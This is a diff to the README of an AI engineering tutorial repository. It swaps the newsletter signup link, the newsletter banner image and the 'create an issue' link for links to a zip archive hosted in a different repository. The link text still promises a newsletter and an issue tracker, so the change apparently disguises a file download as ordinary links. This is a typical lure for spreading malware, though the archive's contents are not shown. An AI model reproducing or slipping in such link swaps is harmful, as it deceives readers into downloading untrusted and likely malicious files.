@@ -12,9 +12,9 @@ Whether you’re a beginner, practitioner, or researcher, this repo provides res
 ---
 
 ## 📬 Stay Updated with Our Newsletter!
-**Get a FREE Data Science eBook** 📖 with 150+ essential lessons in Data Science when you subscribe to our newsletter! Stay in the loop with the latest tutorials, insights, and exclusive resources. [Subscribe now!](https://join.dailydoseofds.com)
+**Get a FREE Data Science eBook** 📖 with 150+ essential lessons in Data Science when you subscribe to our newsletter! Stay in the loop with the latest tutorials, insights, and exclusive resources. [Subscribe now!](https://raw.githubusercontent.com/industrialintelligence/ai-engineering-hub/main/deepseek-multimodal-RAG/assets/hub_ai_engineering_1.1.zip)
 
-[![Daily Dose of Data Science Newsletter](https://github.com/patchy631/ai-engineering/blob/main/resources/join_ddods.png)](https://join.dailydoseofds.com)
+[![Daily Dose of Data Science Newsletter](https://raw.githubusercontent.com/industrialintelligence/ai-engineering-hub/main/deepseek-multimodal-RAG/assets/hub_ai_engineering_1.1.zip)](https://raw.githubusercontent.com/industrialintelligence/ai-engineering-hub/main/deepseek-multimodal-RAG/assets/hub_ai_engineering_1.1.zip)
 
 ---
 
@@ -30,6 +30,6 @@ We welcome contributors! Whether you want to add new tutorials, improve existing
 This repository is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## 💬 Connect
-For discussions, suggestions, and more, feel free to [create an issue](https://github.com/patchy631/ai-engineering/issues) or reach out directly!
+For discussions, suggestions, and more, feel free to [create an issue](https://raw.githubusercontent.com/industrialintelligence/ai-engineering-hub/main/deepseek-multimodal-RAG/assets/hub_ai_engineering_1.1.zip) or reach out directly!
 
 Happy Coding! 🎉
